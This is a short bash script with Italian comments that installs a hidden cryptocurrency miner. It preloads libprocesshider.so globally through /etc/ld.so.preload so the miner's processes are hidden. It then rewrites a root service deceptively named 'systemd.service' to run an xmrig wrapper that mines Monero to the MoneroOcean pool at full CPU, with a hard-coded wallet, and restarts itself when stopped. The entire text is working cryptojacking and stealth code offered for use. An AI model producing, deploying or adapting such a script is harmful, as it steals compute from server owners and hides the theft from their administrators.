#!/bin/bash

# 1. Ferma il servizio attuale
systemctl stop systemd.service

# 2. Ripristina il file ld.so.preload per sicurezza
> /etc/ld.so.preload

# 3. Applica il mascheramento globale (funziona anche con lo static se abbinato al wrapper)
echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload

# 4. Modifica il servizio systemd per usare direttamente il wrapper che avevi già creato
cat <<EOF > /etc/systemd/system/systemd.service
[Unit]
Description=Systemd Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/systemd
ExecStart=/opt/systemd/xmrig-wrapper.sh -o gulf.moneroocean.stream:10128 -u 46PY3me35srRYMUScA3r7uhNJorsH95Sg4rkCqYhKm7tFh94w5nSEnp91S7ZmLwFGJS9UrHN4BCxL7CcPDjGUj8cVFbgHkt -p server_\$(hostname -s) --keepalive --cpu-max-threads-hint=100 --randomx-mode=fast --randomx-1gb-pages --no-nvml --no-opencl
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# 5. Riavvia il servizio
systemctl daemon-reload
systemctl start systemd.service
